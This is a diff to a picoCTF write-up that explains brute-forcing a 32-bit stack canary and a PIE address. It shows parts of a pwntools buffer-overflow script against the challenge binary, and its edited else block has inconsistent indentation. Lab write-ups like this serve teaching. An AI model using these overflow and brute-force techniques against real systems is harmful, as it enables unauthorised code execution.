@@ -98,7 +98,7 @@ Important points:
 ### Analysis
 
 As you can see, the program asks for user input twice, one to store as string size for the next input, and the second is for just input.
-For the first bit of input we are able to set a size for count which will define how much text we can feed it the next input. 
+For the first bit of input we are able to set a size for count which will define how much text we can feed it the next input.
 
 We can also see that the canary is actually read off a file in the `read_canary()` function.
 
@@ -107,7 +107,7 @@ As mentioned earlier - since this is 32-bit we can actually brute-force it. Just
 The distance to `$eip` can be found through earlier tricks - `cyclic`, using a disassembler, etc. Just make sure you set the size before if you're dynamically analyzing.
 Note, the canary in the file doesn't change - once you cleared the brute-forcing and run into an error after, you can just create a script that skips the actual brute-forcing and instead go straight to overriding the `$eip`.
 
-Through `checksec` we can see that PIE has been enabled. This means it won't be as easy to get to the location of the `display_flag()` function. However this can be brute-forced as well. Just run it through with the address `0x7ed` until a hint of pico is found in the return string and you should have it. 
+Through `checksec` we can see that PIE has been enabled. This means it won't be as easy to get to the location of the `display_flag()` function. However this can be brute-forced as well. Just run it through with the address `0x7ed` until a hint of pico is found in the return string and you should have it.
 
 ```c
 from pwn import *
@@ -152,9 +152,9 @@ for i in range(4):
 			canary += chr(j)
 			print("\nCanary Character", i + 1, "=", chr(j), "\n")
 			break
-    #else:
-	#print("error")
-	#exit()
+    else:
+	    print("error")
+      exit()
 
 print("Brute forcing canary successful.\nCanary value is:", canary, "\n")
 
@@ -163,7 +163,7 @@ flag = ""
 # brute forcing display_flag() address
 while "pico" not in flag:
 	p = s.process('/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe/vuln', cwd='/problems/canary_6_c4c3b4565f3c8c0c855907b211b63efe')
-	
+
 	# real payload
 	payload = b'A'*buf_canary
 	payload += bytes(canary, 'utf-8')
@@ -184,4 +184,4 @@ print(flag)
 
 # do this
 p.interactive()
-``` 
+```
